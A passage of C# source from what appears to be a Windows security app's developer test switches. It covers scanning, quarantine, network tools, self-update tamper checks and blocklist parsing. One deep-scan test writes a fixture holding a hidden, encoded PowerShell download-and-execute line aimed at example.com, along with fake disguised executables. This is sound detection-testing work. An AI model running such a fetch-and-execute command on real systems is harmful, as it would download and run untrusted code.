                        new ProposedAction { Type = "update", Path = rec.FilePath, Reason = "A newer version may not have this problem.", Risk = "Installs the newer version with winget", Pkg = new Pkg { Name = "Example App", Version = "1.0", Available = "1.2" } },
                        new ProposedAction { Type = "ignore", Reason = "You decide this one is fine.", Risk = "Visually Safe will trust this file" },
                        new ProposedAction { Type = "delete", Path = rec.FilePath, Reason = "Removes it for good.", Risk = "Permanent, can't be undone", Permanent = true },
                    };
                    using (var of = new FixOptionsForm(rec.Name, "This file pretends to be a PDF but is really a program, a common trick for spreading malware.", opts))
                    {
                        of.StartPosition = FormStartPosition.Manual; of.Location = new Point(40, 20);
                        of.Show(); Application.DoEvents();
                        using (var bmp = new Bitmap(of.Width, of.Height)) { of.DrawToBitmap(bmp, new Rectangle(0, 0, of.Width, of.Height)); bmp.Save(Path.Combine(outDir, "options.png"), ImageFormat.Png); }
                    }
                }
                return 0;
            }

            if (Array.IndexOf(args, "--net-tools-test") >= 0)   // developer aid: run every network tool once and write what they found to <data>\net-tools-test.log
            {
                var lg = new System.Text.StringBuilder();
                var nt = new NetTools(dataDir);
                Action<string, Func<bool>> run = (name, start) =>
                {
                    var sw = Stopwatch.StartNew();
                    start();
                    while (nt.Running && sw.Elapsed.TotalSeconds < 120) System.Threading.Thread.Sleep(200);
                    lg.AppendLine("=== " + name + " (" + sw.ElapsedMilliseconds + " ms)");
                    foreach (var r in nt.Results) lg.AppendLine("  [" + r.Sev + "] " + r.Title + " | " + r.Detail);
                };
                run("health", () => nt.RunHealth());
                run("listening", () => nt.RunListening());
                run("ping", () => nt.RunPing("1.1.1.1"));
                run("dns", () => nt.RunDns("example.com"));
                run("trace", () => nt.RunTrace("1.1.1.1"));
                run("scan localhost top100", () => nt.RunPortScan("127.0.0.1", "top100", false));
                run("scan public blocked", () => nt.RunPortScan("8.8.8.8", "53", false));
                run("scan bad ports", () => nt.RunPortScan("127.0.0.1", "abc", false));
                if (Array.IndexOf(args, "--devices") >= 0) run("devices", () => nt.RunDevices());
                File.WriteAllText(Path.Combine(dataDir, "net-tools-test.log"), lg.ToString());
                return 0;
            }

            if (Array.IndexOf(args, "--agent-test") >= 0)   // developer aid: find agents, start Codex once with a harmless one-word prompt, and open (then close) a terminal
            {
                var lg = new System.Text.StringBuilder();
                var ags = Agents.Detect(true);
                foreach (var a in ags) lg.AppendLine(a.Name + ": " + (a.Found ? a.Path + " | " + a.Version : "not found"));
                var cx = ags.FirstOrDefault(a => a.Id == "codex" && a.Found);
                string work = AgentRunner.WorkDir(dataDir);
                lg.AppendLine("prompt file: " + AgentRunner.WritePrompt(dataDir, AgentPrompt.ForReport(new Engine(dataDir))));
                if (cx != null)
                {
                    var outp = new System.Text.StringBuilder();
                    var sw = Stopwatch.StartNew();
                    int code = AgentRunner.RunHeadless(cx, AgentMode.ReadOnly, work, "Reply with exactly the single word PONG and nothing else. Do not use any tools.", l => outp.AppendLine(l), new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(90)).Token);
                    lg.AppendLine("codex read-only run: exit " + code + " in " + sw.ElapsedMilliseconds + " ms");
                    lg.AppendLine(outp.ToString().Length > 1500 ? outp.ToString().Substring(0, 1500) : outp.ToString());
                    string pf = Path.Combine(work, "agent-test.md"); File.WriteAllText(pf, "dummy");
                    var term = AgentRunner.LaunchTerminal(cx, work, pf);
                    System.Threading.Thread.Sleep(3000);
                    lg.AppendLine("terminal window process alive after 3 s: " + !term.HasExited);
                    AgentRunner.Kill(term);
                }
                File.WriteAllText(Path.Combine(dataDir, "agent-test.log"), lg.ToString());
                return 0;
            }

            if (Array.IndexOf(args, "--install-test") >= 0)   // developer aid: show the install plan for each agent and run read-only npm checks (installs nothing)
            {
                var lg = new System.Text.StringBuilder();
                foreach (var a in Agents.Detect(true))
                {
                    string sm; var st = Agents.InstallSteps(a, out sm);
                    lg.AppendLine(a.Name + ": found=" + a.Found + " | plan: " + (st == null ? "none" : string.Join(" ; ", st.Select(x => System.IO.Path.GetFileName(x[0]) + " " + x[1]))));
                }
                string npm = Agents.FindNpm();
                lg.AppendLine("npm: " + npm);
                foreach (string cmd in new[] { "--version", "view @anthropic-ai/claude-code version", "view @openai/codex version" })
                {
                    var psi = new ProcessStartInfo("cmd.exe", Agents.CmdArgs(npm, cmd, false)) { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true };
                    using (var p = Process.Start(psi)) { string o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd(); p.WaitForExit(60000); lg.AppendLine("npm " + cmd + " -> " + o.Trim().Replace("\n", " ")); }
                }
                File.WriteAllText(Path.Combine(dataDir, "install-test.log"), lg.ToString());
                return 0;
            }

            if (Arg(args, "--saver-shot") != null)   // developer aid: pictures of the screen saver (drawn off-screen)
            {
                using (var e = new Engine(dataDir)) ScreenSaver.Demo(e, Arg(args, "--saver-shot"), int.Parse(Arg(args, "--seconds") ?? "10"));
                return 0;
            }

            if (Array.IndexOf(args, "--deep-test") >= 0)   // developer aid: make files the deep scan should flag, run it on them, and log what it said
            {
                var lg = new System.Text.StringBuilder();
                string d = Path.Combine(dataDir, "deep"); Directory.CreateDirectory(d);
                File.WriteAllText(Path.Combine(d, "dropper.ps1"), "powershell -w hidden -enc " + new string('A', 60) + "\r\n$c = New-Object Net.WebClient; IEX ($c.DownloadString('http://example.com/x'))");
                File.WriteAllText(Path.Combine(d, "harmless.ps1"), "Write-Host 'hello'");
                File.WriteAllText(Path.Combine(d, "notes.txt"), "just notes");
                using (var za = System.IO.Compression.ZipFile.Open(Path.Combine(d, "bundle.zip"), System.IO.Compression.ZipArchiveMode.Create))
                {
                    za.CreateEntry("readme.txt");
                    var en = za.CreateEntry("invoice.pdf.exe"); using (var w = new StreamWriter(en.Open())) w.Write("MZ test");
                }
                string withAds = Path.Combine(d, "photo.jpg"); File.WriteAllText(withAds, "not really a jpeg");
                try { File.WriteAllBytes(withAds + ":hidden.exe", new byte[] { (byte)'M', (byte)'Z', 1, 2, 3, 4, 5, 6 }); } catch (Exception ex) { lg.AppendLine("ADS write failed: " + ex.Message); }
                var ent = new byte[40000]; new Random(3).NextBytes(ent); ent[0] = (byte)'M'; ent[1] = (byte)'Z';
                File.WriteAllBytes(Path.Combine(d, "packed.exe"), ent);
                File.WriteAllText(Path.Combine(dataDir, "settings.ini"), "enabled=1\r\ncloud=0\r\nautoQuarantine=0\r\nfolders=" + d + "\r\n");
                using (var e = new Engine(dataDir))
                {
                    e.Deep.SetActive(true);
                    for (int i = 0; i < 90 && !e.Deep.Phase.StartsWith("Every"); i++) System.Threading.Thread.Sleep(500);
                    lg.AppendLine("deep scan: " + e.Deep.Done + " of " + e.Deep.Total + " done, " + e.Deep.Flagged + " flagged, phase: " + e.Deep.Phase);
                    foreach (var kv in e.LedgerSnapshot().OrderBy(x => x.Key)) lg.AppendLine("  " + Path.GetFileName(kv.Key) + " | " + kv.Value.Verdict + " | deep=" + kv.Value.Deep + " | " + kv.Value.Detail);
                    e.Deep.SetActive(false);
                }
                File.WriteAllText(Path.Combine(dataDir, "deep-test.log"), lg.ToString());
                return 0;
            }

            if (Array.IndexOf(args, "--disk-test") >= 0)   // developer aid: read-only look at the disk-map reader (needs administrator rights)
            {
                var lg = new System.Text.StringBuilder();
                string dr = DefragService.Drive;
                lg.AppendLine("drive " + dr + " ssd=" + DiskMap.IsSsd(dr) + " admin=" + Admin.IsAdmin);
                try
                {
                    var sw = Stopwatch.StartNew();
                    var sn = DiskMap.Build(dr, DefragService.Cols, DefragService.Rows, System.Threading.CancellationToken.None, null, st => { });
                    lg.AppendLine("mapped in " + sw.ElapsedMilliseconds + " ms: " + sn.FileCount + " files, " + sn.Fragmented + " fragmented, cluster " + sn.ClusterBytes + " bytes, " + sn.TotalClusters + " clusters");
                    int used = sn.Used.Count(x => x > 0), owned = sn.Owner.Count(x => x >= 0);
                    lg.AppendLine("blocks used " + used + " of " + sn.Used.Length + ", with a known file " + owned);
                }
                catch (Exception ex) { lg.AppendLine("failed: " + ex.Message); }
                File.WriteAllText(Path.Combine(dataDir, "disk-test.log"), lg.ToString());
                return 0;
            }

            if (Array.IndexOf(args, "--saver-reg-test") >= 0)   // developer aid: register/unregister the Windows screen saver on a scratch registry key (never the real settings), and try the pipe
            {
                var lg = new System.Text.StringBuilder();
                const string scratch = @"Software\VisuallySafeTest\Desktop";
                using (var k = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(scratch)) { k.SetValue("SCRNSAVE.EXE", @"C:\Windows\System32\Bubbles.scr"); k.SetValue("ScreenSaveActive", "1"); k.SetValue("ScreenSaveTimeOut", "900"); }
                var st = Settings.Load(dataDir);
                SystemSaver.Enable(st, 7, scratch, false);
                using (var k = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(scratch))
                    lg.AppendLine("after enable: scr=" + k.GetValue("SCRNSAVE.EXE") + " active=" + k.GetValue("ScreenSaveActive") + " timeout=" + k.GetValue("ScreenSaveTimeOut") + " | saved previous=" + st.PrevScr + "/" + st.PrevTimeout + " | registered=" + SystemSaver.IsRegistered(scratch) + " | scr file exists=" + File.Exists(SystemSaver.ScrPath));
                SystemSaver.Disable(st, scratch, false);
                using (var k = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(scratch))
                    lg.AppendLine("after disable: scr=" + k.GetValue("SCRNSAVE.EXE") + " active=" + k.GetValue("ScreenSaveActive") + " timeout=" + k.GetValue("ScreenSaveTimeOut") + " | registered=" + SystemSaver.IsRegistered(scratch));
                Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\VisuallySafeTest", false);
                try { File.Delete(SystemSaver.ScrPath); } catch { }
                string got = null;
                SaverPipe.StartServer(dataDir, (cmd, done) => { got = cmd; done(); });
                System.Threading.Thread.Sleep(500);
                bool ok = SaverPipe.TryClient(dataDir, "SAVER", true);
                lg.AppendLine("pipe round trip: client ok=" + ok + ", server received=" + got);
                File.WriteAllText(Path.Combine(dataDir, "saver-reg-test.log"), lg.ToString());
                return 0;
            }

            string stArg = Arg(args, "--selftest");   // used by the AI update: run the safety checks and write the results to a file
            if (stArg != null) return SelfUpdate.SelfTest(stArg);
            if (Arg(args, "--update-test") != null)   // developer aid: run the update pipeline on a harmless fake edit (never installs)
            {
                var lg = new System.Text.StringBuilder();
                using (var e2 = new Engine(dataDir))
                {
                    var ss = SelfUpdate.Prepare(e2);
                    File.AppendAllText(Path.Combine(ss.Work, "src", "Ai.cs"), Environment.NewLine + "// harmless test edit" + Environment.NewLine);
                    File.WriteAllText(Path.Combine(ss.Work, "CHANGES.md"), "test change");
                    var rep = SelfUpdate.Inspect(ss);
                    lg.AppendLine("changed=" + string.Join(",", rep.Changed) + " added=" + string.Join(",", rep.Added) + " ok=" + rep.Ok);
                    foreach (var w in rep.Warnings) lg.AppendLine("warn: " + w);
                    bool built = SelfUpdate.Build(ss, l => lg.AppendLine("build: " + l));
                    lg.AppendLine("built=" + built);
                    if (built) lg.AppendLine("selftest=" + SelfUpdate.SelfTestNew(ss, l => lg.AppendLine("  " + l)));
                    File.AppendAllText(Path.Combine(ss.Work, "src", "SelfUpdate.cs"), Environment.NewLine + "// tamper" + Environment.NewLine);
                    var rep2 = SelfUpdate.Inspect(ss);
                    lg.AppendLine("tamper ok=" + rep2.Ok + " blockers=" + string.Join("|", rep2.Blockers));
                    try { Directory.Delete(ss.Root, true); } catch { }
                }
                File.WriteAllText(Arg(args, "--update-test"), lg.ToString());
                return 0;
            }
            if (Arg(args, "--help-test") != null)   // developer aid: which built-in answer the wizard picks for some typical questions
            {
                string nl3 = Environment.NewLine;
                var sb = new System.Text.StringBuilder();
                sb.Append("tips: " + WizardHelp.Tips.Length + ", topics: " + WizardHelp.Topics.Length + nl3);
                foreach (string q in new[] { "my computer is frozen", "the internet is not working", "someone phoned me saying my computer has a virus", "how do i copy and paste", "i cannot hear anything", "my grandson needs money", "what is the weather", "the printer wont print", "i forgot my password", "i lost a file", "pop up keeps appearing" })
                {
                    var t = WizardHelp.Find(q);
                    sb.Append(q + " => " + (t != null ? t.Title : "(no match)") + nl3);
                }
                int longest = 0; foreach (var t in WizardHelp.Topics) longest = Math.Max(longest, t.Text.Length);
                sb.Append("longest answer: " + longest + " characters" + nl3);
                File.WriteAllText(Arg(args, "--help-test"), sb.ToString());
                return 0;
            }
            if (Arg(args, "--health-test") != null)   // developer aid: what the wizard would say about Windows' protection right now
            {
                int lv; bool fx; string t = Wizard.HealthText(out lv, out fx);
                var dets = DefenderLink.Detections(DateTime.Now.AddDays(-3650));
                string nl2 = Environment.NewLine;
                File.WriteAllText(Arg(args, "--health-test"), "level=" + lv + " fixable=" + fx + nl2 + t + nl2 + "history: " + dets.Count + " detections" + nl2 + string.Join(nl2, dets.Select(d => d.When + " | " + d.Name + " | " + DefenderLink.Plain(d.Name))));
                return 0;
            }
            if (Arg(args, "--wizard-demo") != null)   // developer aid: show the wizard with a spoken message for a while, in a throwaway data folder
            {
                string tmpw = Path.Combine(Path.GetTempPath(), "tg-wiz-" + Guid.NewGuid().ToString("N").Substring(0, 6));
                Environment.SetEnvironmentVariable("VISUALLYSAFE_NOSHIELDS", "1");
                var e9 = new Engine(Path.Combine(tmpw, "data"));
                Directory.CreateDirectory(e9.DataDir);
                new HelperConfig { On = true, Name = "Sam", IntroDone = true }.Save(e9.DataDir);
                Application.EnableVisualStyles();
                Helper.Start(e9);
                int secs; int.TryParse(Arg(args, "--wizard-demo"), out secs); if (secs < 5) secs = 30;
                var tw = new System.Windows.Forms.Timer { Interval = 3000 };
                tw.Tick += (s2, e2) => { tw.Stop(); Wizard.Cast(12); };
                tw.Start();
                var te = new System.Windows.Forms.Timer { Interval = secs * 1000 };
                te.Tick += (s2, e2) => Application.Exit();
                te.Start();
                Application.Run();
                return 0;
            }
            if (Arg(args, "--selection-test") != null)   // developer aid: select a few desktop icons, then see what the selection reader finds
            {
                var lg = new System.Text.StringBuilder();
                try
                {
                    var lvw = ScanGlow.DesktopListForTest();
                    var items = System.Windows.Automation.AutomationElement.FromHandle(lvw).FindAll(System.Windows.Automation.TreeScope.Descendants, new System.Windows.Automation.PropertyCondition(System.Windows.Automation.AutomationElement.ControlTypeProperty, System.Windows.Automation.ControlType.ListItem));
                    lg.AppendLine("desktop items: " + items.Count);
                    int n = 0;
                    foreach (System.Windows.Automation.AutomationElement it in items)
                    {
                        object pat;
                        if (n < 4 && it.TryGetCurrentPattern(System.Windows.Automation.SelectionItemPattern.Pattern, out pat))
                        {
                            var sp = (System.Windows.Automation.SelectionItemPattern)pat;
                            if (n == 0) sp.Select(); else sp.AddToSelection();
                            n++;
                        }
                    }
                    lg.AppendLine("selected by test: " + n);
                    System.Threading.Thread.Sleep(500);
                    foreach (string sp2 in ScanGlow.SelectedPaths()) lg.AppendLine("found: " + sp2);
                }
                catch (Exception ex) { lg.AppendLine("error: " + ex); }
                File.WriteAllText(Arg(args, "--selection-test"), lg.ToString());
                return 0;
            }
            if (Arg(args, "--desktop-scan-test") != null)   // developer aid: scan every Desktop item the way a selection does and report which ones don't finish
            {
                var lg = new System.Text.StringBuilder();
                string tmpd = Path.Combine(Path.GetTempPath(), "tg-desk-" + Guid.NewGuid().ToString("N").Substring(0, 6));
                Environment.SetEnvironmentVariable("VISUALLYSAFE_NOSHIELDS", "1");
                using (var e7 = new Engine(Path.Combine(tmpd, "data")))
                {
                    e7.S.AutoQuarantine = false;
                    var items = new System.Collections.Generic.List<string>();
                    foreach (string d in new[] { Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) })
                        try { items.AddRange(Directory.GetFileSystemEntries(d)); } catch { }
                    var files = items.FindAll(x => !Directory.Exists(x)); var dirs = items.FindAll(x => Directory.Exists(x));
                    lg.AppendLine("desktop items: " + files.Count + " files/shortcuts, " + dirs.Count + " folders");
                    var sw = System.Diagnostics.Stopwatch.StartNew();
                    foreach (string f in files) e7.ScanNow(f);
                    var pending = new System.Collections.Generic.List<string>(files);
                    while (pending.Count > 0 && sw.Elapsed.TotalSeconds < 150) { System.Threading.Thread.Sleep(500); pending.RemoveAll(x => e7.ProgressOf(x) < 0); }
                    lg.AppendLine("files/shortcuts: " + (files.Count - pending.Count) + " finished, " + pending.Count + " not finished after " + sw.Elapsed.TotalSeconds.ToString("0") + "s");
                    foreach (string f in pending) lg.AppendLine("   STUCK: " + f + " progress=" + e7.ProgressOf(f).ToString("0.00"));
                    var noLedger = files.FindAll(x => e7.LedgerGet(x) == null);
                    lg.AppendLine("files with no scan record: " + noLedger.Count);
                    foreach (string f in noLedger) lg.AppendLine("   NO RECORD: " + f + " (exists=" + File.Exists(f) + ")");
                    var sw2 = System.Diagnostics.Stopwatch.StartNew();
                    foreach (string d in dirs) e7.ScanNow(d);
                    System.Threading.Thread.Sleep(25000);
                    foreach (string d in dirs) lg.AppendLine("folder " + Path.GetFileName(d) + ": progress=" + e7.ProgressOf(d).ToString("0.00") + (e7.ProgressOf(d) < 0 ? " (done)" : ""));
                    e7.S.AutoQuarantine = false;
                }
                File.WriteAllText(Arg(args, "--desktop-scan-test"), lg.ToString());
                return 0;
            }
            if (Arg(args, "--mixed-scan-test") != null)   // developer aid: scan every item in a folder (broken shortcuts included), then again after the first round
            {
                var lg = new System.Text.StringBuilder();
                string dir = Arg(args, "--mixed-dir"); string tmpd = Path.Combine(Path.GetTempPath(), "tg-mixed-" + Guid.NewGuid().ToString("N").Substring(0, 6));
                Environment.SetEnvironmentVariable("VISUALLYSAFE_NOSHIELDS", "1");
                using (var e6 = new Engine(Path.Combine(tmpd, "data")))
                {
                    var items = Directory.GetFileSystemEntries(dir);
                    for (int round = 1; round <= 2; round++)
                    {
                        var t0 = DateTime.Now;
                        foreach (string f in items) e6.ScanNow(f);
                        for (int i = 0; i < 60; i++)
                        {
                            System.Threading.Thread.Sleep(500);
                            int pending = 0; foreach (string f in items) if (e6.ProgressOf(f) >= 0) pending++;
                            if (pending == 0) break;
                        }
                        int got = 0; foreach (string f in items) { var le = e6.LedgerGet(f); if (le != null && le.Time >= t0) got++; }
                        lg.AppendLine("round " + round + ": " + items.Length + " items, rescanned/in ledger " + got + ", took " + (DateTime.Now - t0).TotalSeconds.ToString("0.0") + "s");
                        foreach (string f in items) lg.AppendLine("   " + Path.GetFileName(f) + " progress=" + e6.ProgressOf(f) + " ledger=" + (e6.LedgerGet(f) != null));
                    }
                }
                File.WriteAllText(Arg(args, "--mixed-scan-test"), lg.ToString());
                return 0;
            }
            if (Arg(args, "--multi-scan-test") != null)   // developer aid: queue several manual scans and see how many get done
            {
                var lg = new System.Text.StringBuilder();
                string tmp = Path.Combine(Path.GetTempPath(), "tg-multi-" + Guid.NewGuid().ToString("N").Substring(0, 6)); Directory.CreateDirectory(tmp);
                var paths = new System.Collections.Generic.List<string>();
                for (int i = 0; i < 8; i++) { string f = Path.Combine(tmp, "file" + i + ".txt"); File.WriteAllText(f, "hello " + i + Guid.NewGuid()); paths.Add(f); }
                using (var e3 = new Engine(Path.Combine(tmp, "data")))
                {
                    foreach (string f in paths) e3.ScanNow(f);
                    System.Threading.Thread.Sleep(6000);
                    int got = 0; foreach (string f in paths) if (e3.LedgerGet(f) != null) got++;
                    lg.AppendLine("queued " + paths.Count + ", in ledger " + got);
                }
                try { Directory.Delete(tmp, true); } catch { }
                File.WriteAllText(Arg(args, "--multi-scan-test"), lg.ToString());
                return 0;
            }
            if (Arg(args, "--shield-test") != null)   // developer aid: run the ransomware simulation, the list parsers and the feed parser
            {
                var lg = new System.Text.StringBuilder();
                string tmp = Path.Combine(Path.GetTempPath(), "tg-shield-" + Guid.NewGuid().ToString("N").Substring(0, 6)); Directory.CreateDirectory(tmp);
                Environment.SetEnvironmentVariable("VISUALLYSAFE_NOSHIELDS", "1");
                using (var e5 = new Engine(Path.Combine(tmp, "data")))
                {
                    lg.AppendLine("ransomware simulation: " + RansomShield.SelfTest(e5.Shield, e5));
                    var dom = WebShield.ParseList("# c\n0.0.0.0 evil-example.com\n127.0.0.1 bad.example.net # x\nphish.example.org\n10.0.0.1\n0.0.0.0 microsoft.com\n0.0.0.0 login.microsoft.com\nnot a domain\n");
                    lg.AppendLine("list parser: " + (dom.Count == 3 && dom.Contains("evil-example.com") && dom.Contains("bad.example.net") && dom.Contains("phish.example.org") ? "PASS" : "FAIL " + string.Join(",", dom)));
                    int added; string hash1 = new string('a', 64), hash2 = new string('b', 64);
                    string err = HashFeed.Apply(e5, "{\"query_status\":\"ok\",\"data\":[{\"sha256_hash\":\"" + hash1 + "\"},{\"sha256_hash\":\"" + hash2 + "\"},{\"sha256_hash\":\"short\"}]}", out added);
                    lg.AppendLine("hash feed parser: " + (err == null && added == 2 && e5.IsBlockedHash(hash1) ? "PASS" : "FAIL " + err + " " + added));
                    var junk = new byte[4096]; new Random(1).NextBytes(junk); string jp = Path.Combine(tmp, "x.docx"); File.WriteAllBytes(jp, junk);
                    string tp = Path.Combine(tmp, "y.txt"); File.WriteAllText(tp, string.Join(" ", System.Linq.Enumerable.Range(0, 400).Select(x => "w" + x)));
                    lg.AppendLine("encryption detector: " + (RansomShield.LooksEncrypted(jp) && !RansomShield.LooksEncrypted(tp) ? "PASS" : "FAIL"));
                }
                try { Directory.Delete(tmp, true); } catch { }
                File.WriteAllText(Arg(args, "--shield-test"), lg.ToString());
                return 0;
            }
            if (Arg(args, "--quarantine-test") != null)   // developer aid: quarantine a test file, check the stand-in is left, scan it again
            {
                var lg = new System.Text.StringBuilder();
                string tmp = Path.Combine(Path.GetTempPath(), "tg-quar-" + Guid.NewGuid().ToString("N").Substring(0, 6)); Directory.CreateDirectory(tmp);
                string f = Path.Combine(tmp, "eicar.com");
                string body = "bad test " + Guid.NewGuid(); File.WriteAllText(f, body); Directory.CreateDirectory(Path.Combine(tmp, "data")); using (var sh = System.Security.Cryptography.SHA256.Create()) File.WriteAllText(Path.Combine(tmp, "data", "blocklist.txt"), BitConverter.ToString(sh.ComputeHash(System.Text.Encoding.UTF8.GetBytes(body))).Replace("-", "").ToLower());
                using (var e4 = new Engine(Path.Combine(tmp, "data")))
                {
                    e4.ScanNow(f); System.Threading.Thread.Sleep(6000);
                    lg.AppendLine("after scan: exists=" + File.Exists(f) + " size=" + (File.Exists(f) ? new FileInfo(f).Length : -1) + " ledger=" + (e4.LedgerGet(f) == null ? "none" : e4.LedgerGet(f).Verdict + " q=" + e4.LedgerGet(f).Quarantined));
                    e4.ScanNow(f); System.Threading.Thread.Sleep(6000);
                    lg.AppendLine("after rescan: exists=" + File.Exists(f) + " ledger=" + (e4.LedgerGet(f) == null ? "none" : e4.LedgerGet(f).Verdict + " q=" + e4.LedgerGet(f).Quarantined) + " quarantined items=" + e4.QuarantineSnapshot().Count);
                }
                try { Directory.Delete(tmp, true); } catch { }
                File.WriteAllText(Arg(args, "--quarantine-test"), lg.ToString());
                return 0;
            }
            if (Arg(args, "--hover-debug") != null) { var xy = Arg(args, "--hover-debug").Split((char)44); var eh = new Engine(dataDir); File.WriteAllText(Path.Combine(Path.GetTempPath(), "hoverdebug.txt"), ScanGlow.HoverDebug(eh, new System.Drawing.Point(int.Parse(xy[0]), int.Parse(xy[1])))); return 0; }
            if (Arg(args, "--badge-shot") != null) { var eb = new Engine(dataDir); using (var dlg = new BadgeDialog(eb)) { dlg.Show(); Application.DoEvents(); using (var bm = new System.Drawing.Bitmap(dlg.Width, dlg.Height)) { dlg.DrawToBitmap(bm, new System.Drawing.Rectangle(0, 0, dlg.Width, dlg.Height)); bm.Save(Arg(args, "--badge-shot")); } } return 0; }
            if (Arg(args, "--glow-find") != null) { var fr = ScanGlow.FindItem(Arg(args, "--glow-find")); File.WriteAllText(Path.Combine(Path.GetTempPath(), "glowfind.txt"), (fr != null ? fr.R.ToString() : "not found") + " | " + ScanGlow.DebugDesktop()); return 0; }
            if (Arg(args, "--glow-shot") != null)   // developer aid: draw the scan light over a made-up icon rectangle
            {
                string od = Arg(args, "--glow-shot");
                var back = new Form { FormBorderStyle = FormBorderStyle.None, StartPosition = FormStartPosition.Manual, Bounds = new System.Drawing.Rectangle(100, 100, 400, 300), BackColor = System.Drawing.Color.FromArgb(30, 40, 60), TopMost = false };
                back.Show();
                var gf = ScanGlow.MakeAt(new System.Drawing.Rectangle(200, 150, 96, 110)); gf.Show(); if (Arg(args, "--glow-kind") == "prog") gf.Progress = () => 0.55;
                Action<int> pump = ms => { var sw = System.Diagnostics.Stopwatch.StartNew(); while (sw.ElapsedMilliseconds < ms) { System.Threading.Thread.Sleep(20); Application.DoEvents(); } };
                pump(700);
                using (var bmp = new System.Drawing.Bitmap(400, 300)) using (var g = System.Drawing.Graphics.FromImage(bmp)) { g.CopyFromScreen(100, 100, 0, 0, bmp.Size); bmp.Save(Path.Combine(od, "glow1.png"), System.Drawing.Imaging.ImageFormat.Png); }
                gf.Finish(Arg(args, "--glow-kind") == "red" ? Verdict.Malicious : Arg(args, "--glow-kind") == "yellow" ? Verdict.Suspicious : Verdict.Clean); pump(2200);
                using (var bmp = new System.Drawing.Bitmap(400, 300)) using (var g = System.Drawing.Graphics.FromImage(bmp)) { g.CopyFromScreen(100, 100, 0, 0, bmp.Size); bmp.Save(Path.Combine(od, "glow2.png"), System.Drawing.Imaging.ImageFormat.Png); }
                gf.Close(); back.Close();
                return 0;
            }
            if (Arg(args, "--form-shot") != null)   // developer aid: pictures of the helper setup and AI update windows
            {
                string od = Arg(args, "--form-shot");
                using (var e1 = new Engine(dataDir))
                {
                    foreach (Form fm in new Form[] { new HelperSetupForm(e1), new SelfUpdateForm(e1) })
                    {
                        fm.StartPosition = FormStartPosition.Manual; fm.Location = new System.Drawing.Point(40, 40); fm.Show();
                        for (int i = 0; i < 8; i++) { System.Threading.Thread.Sleep(100); Application.DoEvents(); }
                        using (var bmp = new System.Drawing.Bitmap(fm.Width, fm.Height)) { fm.DrawToBitmap(bmp, new System.Drawing.Rectangle(0, 0, fm.Width, fm.Height)); bmp.Save(Path.Combine(od, "form-" + fm.GetType().Name + ".png"), System.Drawing.Imaging.ImageFormat.Png); }
                        fm.Close();
                    }
                }
                return 0;
            }
            if (Arg(args, "--make-icon") != null) { IconMaker.Make(Arg(args, "--make-icon")); return 0; }   // developer aid: write the program icon

            string trustArg = Arg(args, "--trust");   // developer aid: time the signature check for one file
            if (trustArg != null)
            {
                var sw = Stopwatch.StartNew();
                string who = Trust.TrustedSigner(trustArg);
                File.WriteAllText(Path.Combine(dataDir, "trust.log"), (who ?? "not signed") + " | " + sw.ElapsedMilliseconds + " ms");
                return 0;
            }

            if (Array.IndexOf(args, "--update-rules") >= 0)   // developer aid: run one rule update check, write the result to <data>\update.log
            {
                var y = new Yara(AppDomain.CurrentDomain.BaseDirectory, dataDir);
                bool changed = y.Update();
                File.WriteAllText(Path.Combine(dataDir, "update.log"), (changed ? "changed: " : "same: ") + y.UpdateStatus + " | now " + y.RulesVersion);
                return 0;
            }

            if (shot != null)
            {
                using (var eng = new Engine(dataDir))
                using (var f = new MainForm(eng) { ReallyClose = true })
                {
                    f.Show();
                    string[] names = { "status", "activity", "network", "rootkit", "assistant", "map", "nettools", "defrag", "quarantine", "settings", "shields" };
                    for (int i = 0; i < 11; i++)
                    {
                        if (i == 0 && Environment.GetEnvironmentVariable("VISUALLYSAFE_SCANDEMO") == "1")
                        { eng.QuickScan(); System.Threading.Thread.Sleep(4000); }   // developer aid: show a scan in progress
                        f.SelectPage(i);
                        Application.DoEvents();
                        if (i == 3 && Environment.GetEnvironmentVariable("VISUALLYSAFE_ROOTKITDEMO") == "1")
                            for (int t = 0; t < 240 && !f.RootkitDone; t++) { System.Threading.Thread.Sleep(500); Application.DoEvents(); }
                        Application.DoEvents();
                        if (i == 2 && eng.Net != null && eng.Net.Running)
                        {
                            // let a few seconds of traffic build up so the graphs have something to show
                            for (int t = 0; t < 12; t++) { System.Threading.Thread.Sleep(500); f.RefreshNetwork(); Application.DoEvents(); }
                        }
                        if (i == 6 && Environment.GetEnvironmentVariable("VISUALLYSAFE_PORTSDEMO") == "1") { eng.Tools.RunListening(); for (int t = 0; t < 80; t++) { System.Threading.Thread.Sleep(100); Application.DoEvents(); } }
                        if (i == 7 && Environment.GetEnvironmentVariable("VISUALLYSAFE_DEFRAGDEMO") == "1") { DefragService.Snapshot = DefragDemo.Make(); DefragService.Prev = null; for (int t = 0; t < 6; t++) { System.Threading.Thread.Sleep(100); Application.DoEvents(); } }
                        if (i == 4) for (int t = 0; t < 15; t++) { System.Threading.Thread.Sleep(100); Application.DoEvents(); } // let the AI page's timer run
                        if (i == 4 && Environment.GetEnvironmentVariable("VISUALLYSAFE_DUMP") == "1")
                        {
                            var sbd = new System.Text.StringBuilder();
                            Action<Control, int> walk = null;
                            walk = (c, d) => { foreach (Control ch in c.Controls) { if (c is AssistantView || ch is AssistantView) sbd.AppendLine(new string(' ', d) + ch.GetType().Name + " " + ch.Bounds + " vis=" + ch.Visible + " text=" + (ch.Text.Length > 30 ? ch.Text.Substring(0, 30) : ch.Text)); walk(ch, d + 1); } };
                            walk(f, 0);
                            File.WriteAllText(Path.Combine(shot, "dump.txt"), sbd.ToString());
                        }
                        if (i == 10 && Environment.GetEnvironmentVariable("VISUALLYSAFE_DUMP") == "2")
                        {
                            var sbd = new System.Text.StringBuilder();
                            Action<Control, int> walk = null;
                            walk = (c, d) => { foreach (Control ch in c.Controls) { if (c is ShieldsView || d > 0) sbd.AppendLine(new string(' ', d) + ch.GetType().Name + " " + ch.Bounds + " vis=" + ch.Visible + " text=" + (ch.Text.Length > 30 ? ch.Text.Substring(0, 30) : ch.Text)); if (d == 0 && !(ch is ShieldsView)) continue; walk(ch, d + 1); } };
                            walk(f, 0);
